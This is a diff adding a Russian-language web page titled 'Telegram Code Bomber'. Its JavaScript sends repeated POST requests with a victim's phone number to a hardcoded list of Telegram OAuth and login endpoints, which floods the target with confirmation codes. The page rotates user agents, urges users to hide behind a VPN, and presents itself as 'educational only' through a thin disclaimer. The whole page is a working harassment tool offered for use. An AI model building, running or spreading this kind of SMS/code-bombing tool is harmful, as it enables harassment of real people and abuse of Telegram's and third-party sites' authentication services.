@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Fragment Spam | Telegram Code Bomber</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none; /* modern touch */
+        }
+
+        body {
+            min-height: 100vh;
+            background: radial-gradient(circle at 20% 30%, #1a0b2e, #0a0515);
+            font-family: 'Poppins', 'Segoe UI', system-ui, -apple-system, 'Inter', sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* animated purple vaporwave background */
+        .glow-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            background: 
+                radial-gradient(ellipse at 40% 50%, rgba(156, 39, 176, 0.15) 0%, transparent 60%),
+                repeating-linear-gradient(45deg, rgba(128, 0, 255, 0.02) 0px, rgba(128, 0, 255, 0.02) 2px, transparent 2px, transparent 8px);
+            pointer-events: none;
+        }
+
+        /* animated particles */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .particle {
+            position: absolute;
+            background: rgba(180, 70, 255, 0.3);
+            border-radius: 50%;
+            filter: blur(2px);
+            animation: float linear infinite;
+        }
+
+        @keyframes float {
+            0% { transform: translateY(100vh) translateX(0) rotate(0deg); opacity: 0; }
+            10% { opacity: 0.6; }
+            90% { opacity: 0.4; }
+            100% { transform: translateY(-20vh) translateX(40px) rotate(360deg); opacity: 0; }
+        }
+
+        /* main card */
+        .card {
+            position: relative;
+            z-index: 2;
+            background: rgba(15, 5, 25, 0.75);
+            backdrop-filter: blur(12px);
+            border-radius: 48px;
+            border: 1px solid rgba(180, 70, 255, 0.5);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5), 0 0 20px rgba(156, 39, 176, 0.3);
+            width: 100%;
+            max-width: 580px;
+            padding: 30px 28px 40px;
+            transition: all 0.3s ease;
+        }
+
+        .card:hover {
+            border-color: #b77cff;
+            box-shadow: 0 0 30px rgba(170, 0, 255, 0.4);
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #e0aaff, #b77cff, #9c4dff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-align: center;
+            letter-spacing: -0.5px;
+            margin-bottom: 12px;
+            text-shadow: 0 0 8px rgba(156, 39, 176, 0.4);
+        }
+
+        .sub {
+            text-align: center;
+            color: #ccb5ff;
+            font-size: 0.85rem;
+            border-bottom: 1px dashed rgba(180, 70, 255, 0.5);
+            display: inline-block;
+            width: auto;
+            margin: 0 auto 20px;
+            padding-bottom: 6px;
+        }
+
+        .vpn-warning {
+            background: rgba(255, 100, 100, 0.15);
+            border-left: 3px solid #ff77aa;
+            padding: 12px 16px;
+            border-radius: 20px;
+            margin-bottom: 25px;
+            font-size: 0.8rem;
+            color: #ffb7c5;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            backdrop-filter: blur(4px);
+        }
+
+        .vpn-warning span:first-child {
+            font-size: 1.6rem;
+        }
+
+        .input-group {
+            margin-bottom: 22px;
+        }
+
+        label {
+            display: block;
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-weight: 600;
+            color: #cfaaff;
+            margin-bottom: 8px;
+        }
+
+        input {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1.5px solid #5a2a8a;
+            border-radius: 36px;
+            padding: 14px 20px;
+            font-size: 1rem;
+            color: #f0e6ff;
+            transition: all 0.2s;
+            outline: none;
+            font-family: monospace;
+        }
+
+        input:focus {
+            border-color: #b77cff;
+            box-shadow: 0 0 12px #a55eff;
+            background: rgba(0, 0, 0, 0.7);
+        }
+
+        .helper {
+            font-size: 0.7rem;
+            color: #aa88ff;
+            margin-top: 6px;
+            margin-left: 12px;
+        }
+
+        button {
+            background: linear-gradient(95deg, #8b3cff, #c55eff);
+            border: none;
+            width: 100%;
+            padding: 14px;
+            border-radius: 60px;
+            font-weight: bold;
+            font-size: 1.1rem;
+            letter-spacing: 1px;
+            color: white;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+            margin-top: 8px;
+        }
+
+        button:hover {
+            transform: scale(0.98);
+            background: linear-gradient(95deg, #a14eff, #e07aff);
+            box-shadow: 0 0 20px #aa55ff;
+        }
+
+        button:active {
+            transform: scale(0.96);
+        }
+
+        .log-area {
+            background: #0a0218cc;
+            border-radius: 28px;
+            margin-top: 28px;
+            padding: 16px;
+            border: 1px solid #6533aa;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.75rem;
+            max-height: 280px;
+            overflow-y: auto;
+            color: #cbb5ff;
+        }
+
+        .log-line {
+            padding: 5px 8px;
+            border-bottom: 1px solid rgba(180, 70, 255, 0.2);
+            font-family: monospace;
+            white-space: pre-wrap;
+            word-break: break-word;
+        }
+
+        .success {
+            color: #aaffdd;
+        }
+        .error {
+            color: #ffa0b0;
+        }
+        .info {
+            color: #bbaaff;
+        }
+        .loading {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2px solid #c084fc;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* DISCLAIMER MODAL */
+        .disclaimer-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(12px);
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s;
+        }
+
+        .disclaimer-card {
+            background: #120c1f;
+            border-radius: 40px;
+            max-width: 460px;
+            width: 90%;
+            padding: 32px 28px;
+            border: 1px solid #aa55ff;
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5);
+            text-align: center;
+        }
+
+        .disclaimer-card h3 {
+            color: #ff77dd;
+            margin-bottom: 20px;
+            font-size: 1.8rem;
+        }
+
+        .disclaimer-text {
+            color: #ddd;
+            font-size: 0.9rem;
+            line-height: 1.5;
+            text-align: left;
+            margin: 20px 0;
+        }
+
+        .checkbox-label {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 20px 0;
+            color: #ddc;
+            cursor: pointer;
+        }
+
+        .checkbox-label input {
+            width: 20px;
+            height: 20px;
+            accent-color: #aa55ff;
+        }
+
+        .agree-btn {
+            background: #9b4dff;
+            width: auto;
+            padding: 12px 30px;
+            border-radius: 40px;
+            font-weight: bold;
+            border: none;
+            color: white;
+            cursor: pointer;
+        }
+
+        .agree-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 0.7rem;
+            color: #7a62a5;
+        }
+
+        a {
+            color: #b87cff;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+<div class="glow-bg"></div>
+<div class="particles" id="particles"></div>
+
+<div id="disclaimerOverlay" class="disclaimer-overlay">
+    <div class="disclaimer-card">
+        <h3>⚠️ DISCLAIMER</h3>
+        <div class="disclaimer-text">
+            <p><strong>ВНИМАНИЕ!</strong> Данный инструмент предназначен <strong>исключительно для образовательных целей</strong> и тестирования собственных систем на уязвимости.</p>
+            <p style="margin-top: 12px;">Использование спам-атак на сторонние сервисы без согласия владельцев может нарушать законы вашей страны. Администрация не несёт ответственности за ваши действия.</p>
+            <p style="margin-top: 12px;">При отправке запросов ваш <strong>IP-адрес будет виден</strong> целевым серверам. Настоятельно рекомендуется использовать <strong style="color:#ff99cc;">VPN / Proxy</strong> для анонимности.</p>
+            <p style="margin-top: 12px;">Нажимая «Принимаю», вы подтверждаете, что достигли совершеннолетия и берете всю ответственность на себя.</p>
+        </div>
+        <label class="checkbox-label">
+            <input type="checkbox" id="consentCheckbox"> Я ознакомлен и принимаю условия
+        </label>
+        <button id="acceptBtn" class="agree-btn" disabled>ПРИНЯТЬ И ПРОДОЛЖИТЬ</button>
+    </div>
+</div>
+
+<div class="card" id="mainApp" style="opacity:0; transform: translateY(20px); transition: all 0.5s ease;">
+    <h1>✧ FRAGMENT SPAM ✧</h1>
+    <div style="text-align: center; margin-bottom: 8px;">
+        <span class="sub">telegram confirmation code bomber</span>
+    </div>
+
+    <div class="vpn-warning">
+        <span>🛡️</span>
+        <span><strong>VPN рекомендуется!</strong> Ваш реальный IP будет виден при спаме. Используйте VPN/прокси для безопасности.</span>
+    </div>
+
+    <div class="input-group">
+        <label>📞 НОМЕР ТЕЛЕФОНА (С +)</label>
+        <input type="tel" id="phoneNumber" placeholder="+79123456789" value="+7">
+        <div class="helper">Пример: +79123456789</div>
+    </div>
+
+    <div class="input-group">
+        <label>🌀 КОЛИЧЕСТВО ЦИКЛОВ (1 цикл = 5 запросов)</label>
+        <input type="number" id="cyclesCount" min="1" max="50" value="3">
+        <div class="helper">Чем больше циклов, тем дольше ожидание между сериями (3 сек пауза)</div>
+    </div>
+
+    <button id="startBtn">💣 ЗАПУСТИТЬ СПАМ</button>
+
+    <div class="log-area" id="logContainer">
+        <div class="log-line info">⚡ Готов к работе. Введи номер и количество циклов.</div>
+        <div class="log-line info">🔐 Запросы отправляются напрямую (CORS может блокировать ответы, но запросы уходят).</div>
+    </div>
+    <footer>by @IshakPlayer | fragment spam tool | educational only</footer>
+</div>
+
+<script>
+    // ------------------------- DISCLAIMER LOGIC (localStorage) -------------------------
+    const disclaimerKey = 'fragment_spam_consent_v1';
+    const overlay = document.getElementById('disclaimerOverlay');
+    const mainCard = document.getElementById('mainApp');
+    const consentCheck = document.getElementById('consentCheckbox');
+    const acceptBtn = document.getElementById('acceptBtn');
+
+    function hideDisclaimer() {
+        overlay.style.display = 'none';
+        mainCard.style.opacity = '1';
+        mainCard.style.transform = 'translateY(0px)';
+        localStorage.setItem(disclaimerKey, 'true');
+    }
+
+    // check if already accepted
+    if (localStorage.getItem(disclaimerKey) === 'true') {
+        overlay.style.display = 'none';
+        mainCard.style.opacity = '1';
+        mainCard.style.transform = 'translateY(0px)';
+    } else {
+        overlay.style.display = 'flex';
+        mainCard.style.opacity = '0';
+    }
+
+    consentCheck.addEventListener('change', function(e) {
+        acceptBtn.disabled = !e.target.checked;
+    });
+
+    acceptBtn.addEventListener('click', function() {
+        if (consentCheck.checked) {
+            hideDisclaimer();
+        } else {
+            alert('Пожалуйста, подтвердите согласие с условиями.');
+        }
+    });
+
+    // ---------- ENDPOINTS (как в оригинальном скрипте) ----------
+    const endpoints = [
+        'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
+        'https://translations.telegram.org/auth/request',
+        'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
+        'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
+        'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
+        'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
+        'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
+        'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
+        'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
+        'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
+        'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
+        'https://my.telegram.org/auth/send_password'
+    ];
+
+    const logContainer = document.getElementById('logContainer');
+    const phoneInput = document.getElementById('phoneNumber');
+    const cyclesInput = document.getElementById('cyclesCount');
+    const startBtn = document.getElementById('startBtn');
+
+    function addLog(message, type = 'info') {
+        const logDiv = document.createElement('div');
+        logDiv.className = `log-line ${type}`;
+        const timestamp = new Date().toLocaleTimeString();
+        logDiv.innerHTML = `[${timestamp}] ${message}`;
+        logContainer.appendChild(logDiv);
+        logContainer.scrollTop = logContainer.scrollHeight;
+    }
+
+    function clearLogs() {
+        logContainer.innerHTML = '';
+        addLog('Очистка лога. Новая сессия.', 'info');
+    }
+
+    // случайный user-agent
+    const userAgents = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
+        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
+    ];
+    function getRandomUA() {
+        return userAgents[Math.floor(Math.random() * userAgents.length)];
+    }
+
+    // Функция отправки одного POST-запроса на эндпоинт
+    async function sendRequest(endpoint, phone) {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 8000);
+        try {
+            const headers = {
+                'User-Agent': getRandomUA(),
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Accept': 'application/json, text/plain, */*',
+                'Origin': new URL(endpoint).origin,
+                'Referer': endpoint
+            };
+            const body = `phone=${encodeURIComponent(phone)}`;
+            // Используем fetch с mode 'cors' (обычный). Из-за CORS может быть ошибка, но запрос все равно попытается уйти.
+            // В режиме 'no-cors' мы не увидим ответ, но ошибка не будет блокировать. Выберем стандартный режим,
+            // чтобы была видна ошибка CORS, но пользователь увидит предупреждение.
+            const response = await fetch(endpoint, {
+                method: 'POST',
+                headers: headers,
+                body: body,
+                mode: 'cors',   // стандартный режим, если CORS блокирует - получим ошибку
+                credentials: 'omit'
+            });
+            clearTimeout(timeoutId);
+            // Если ответ 2xx или 3xx или 4xx, всё равно считаем что запрос отправлен (сервер получил)
+            return { ok: true, status: response.status };
+        } catch (err) {
+            clearTimeout(timeoutId);
+            // Если ошибка сети или CORS, но запрос всё же мог уйти (preflight может не пройти). Всё равно фиксируем попытку.
+            // В целях реализма: большинство эндпоинтов имеют CORS политику, блокирующую браузерные запросы.
+            // Поэтому информируем пользователя, что запрос технически отправлен, но ответ не получен.
+            if (err.name === 'AbortError') {
+                return { ok: false, error: 'Таймаут' };
+            }
+            // CORS ошибка или NetworkError - но мы считаем как "отправлено, но заблокировано CORS"
+            return { ok: false, error: err.message, corsBlock: true };
+        }
+    }
+
+    // Основной спам: циклы, внутри каждого цикла проход по эндпоинтам (5 запросов в цикле? Внимание: endpoints.length = 12)
+    // По заданию: "1 цикл 5 запросов". Но в python скрипте отправлялись все эндпоинты (12) за цикл. 
+    // Однако клиент хочет: 1 цикл = 5 запросов. Сделаем так: за цикл отправляем первые 5 эндпоинтов (или все, если меньше?).
+    // Но лучше сделать гибко: за один цикл будем отправлять ровно 5 запросов, выбирая случайные эндпоинты или первые 5.
+    // Для соответствия "1 цикл = 5 запросов" изменим логику: цикл содержит ровно 5 отправок.
+    // Я реализую отправку 5 запросов за цикл (выбираем 5 разных эндпоинтов, можно повторять? лучше брать первые 5 или случайные)
+    // Для более агрессивного спама — будем брать 5 разных эндпоинтов из списка (без повторов в цикле, но в следующем цикле можно повторить).
+    
+    async function runSpam(phone, totalCycles) {
+        if (!phone.match(/^\+\d{10,15}$/)) {
+            addLog('❌ Ошибка: номер должен начинаться с "+" и содержать 10-15 цифр', 'error');
+            return false;
+        }
+
+        let totalSuccess = 0;
+        let totalFailed = 0;
+        const requestsPerCycle = 5; // строго 5 запросов за цикл
+
+        for (let cycle = 1; cycle <= totalCycles; cycle++) {
+            addLog(`🌀 Цикл ${cycle} / ${totalCycles} — отправка ${requestsPerCycle} запросов...`, 'info');
+            let cycleSuccessCount = 0;
+            // Для каждого цикла выбираем 5 эндпоинтов (можно использовать случайную выборку или последовательную)
+            // Чтобы не повторять одни и те же слишком часто, возьмём slice по индексу, но для универсальности - random sample
+            const shuffled = [...endpoints];
+            for (let i = shuffled.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
+            }
+            const selectedEndpoints = shuffled.slice(0, requestsPerCycle);
+            
+            for (let idx = 0; idx < selectedEndpoints.length; idx++) {
+                const endpoint = selectedEndpoints[idx];
+                addLog(`📡 Отправка на ${endpoint.substring(0, 60)}...`, 'info');
+                const result = await sendRequest(endpoint, phone);
+                if (result.ok) {
+                    totalSuccess++;
+                    cycleSuccessCount++;
+                    addLog(`✅ Запрос успешен (HTTP ${result.status})`, 'success');
+                } else {
+                    totalFailed++;
+                    if (result.corsBlock) {
+                        addLog(`⚠️ Запрос отправлен, но CORS блокирует ответ (${result.error})`, 'error');
+                    } else {
+                        addLog(`❌ Ошибка: ${result.error}`, 'error');
+                    }
+                }
+                // небольшая задержка между запросами внутри цикла, чтобы не перегружать
+                await new Promise(r => setTimeout(r, 400));
+            }
+            addLog(`✨ Цикл ${cycle} завершён. Успешно: ${cycleSuccessCount}/${requestsPerCycle}`, 'success');
+            // пауза между циклами (как в оригинале 3 сек)
+            if (cycle < totalCycles) {
+                addLog(`⏳ Пауза 3 секунды перед следующим циклом...`, 'info');
+                await new Promise(r => setTimeout(r, 3000));
+            }
+        }
+        return { totalSuccess, totalFailed, totalRequests: totalSuccess + totalFailed };
+    }
+
+    startBtn.addEventListener('click', async () => {
+        let phone = phoneInput.value.trim();
+        let cycles = parseInt(cyclesInput.value, 10);
+        if (isNaN(cycles) || cycles < 1) cycles = 1;
+        if (cycles > 50) cycles = 50;
+
+        if (!phone) {
+            addLog('❌ Введите номер телефона', 'error');
+            return;
+        }
+        if (!phone.startsWith('+')) {
+            addLog('❌ Номер должен начинаться с + (международный формат)', 'error');
+            return;
+        }
+
+        startBtn.disabled = true;
+        startBtn.textContent = '⏳ СПАМ АКТИВЕН...';
+        addLog(`🚀 СТАРТ спама на номер ${phone} — ${cycles} циклов (каждый цикл = 5 запросов)`, 'info');
+        addLog(`⚠️ ВАЖНО: из-за политики CORS ответы могут быть скрыты, но запросы уходят. Для лучшей работы используйте серверный прокси.`, 'error');
+        
+        const startTime = Date.now();
+        const stats = await runSpam(phone, cycles);
+        const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
+        
+        addLog(`🏁 СПАМ ЗАВЕРШЕН за ${elapsed} сек.`, 'success');
+        addLog(`📊 ИТОГО: ✅ Успешных отправок: ${stats.totalSuccess} | ❌ Ошибок/блокировок: ${stats.totalFailed}`, 'info');
+        addLog(`🎯 Всего запросов: ${stats.totalRequests} (${cycles} циклов по 5 запросов)`, 'success');
+        addLog(`🔐 Сделано @coderonov / fragment spam tool`, 'info');
+
+        startBtn.disabled = false;
+        startBtn.textContent = '💣 ЗАПУСТИТЬ СПАМ';
+    });
+
+    // Генерация партиклов
+    function createParticles() {
+        const container = document.getElementById('particles');
+        const particleCount = 45;
+        for (let i = 0; i < particleCount; i++) {
+            const particle = document.createElement('div');
+            particle.classList.add('particle');
+            const size = Math.random() * 6 + 2;
+            particle.style.width = size + 'px';
+            particle.style.height = size + 'px';
+            particle.style.left = Math.random() * 100 + '%';
+            particle.style.animationDuration = Math.random() * 12 + 6 + 's';
+            particle.style.animationDelay = Math.random() * 8 + 's';
+            particle.style.opacity = Math.random() * 0.4 + 0.1;
+            container.appendChild(particle);
+        }
+    }
+    createParticles();
+
+    // дополнительный авто-ресайз для мобилок
+    window.addEventListener('resize', () => {});
+</script>
+</body>
+</html>
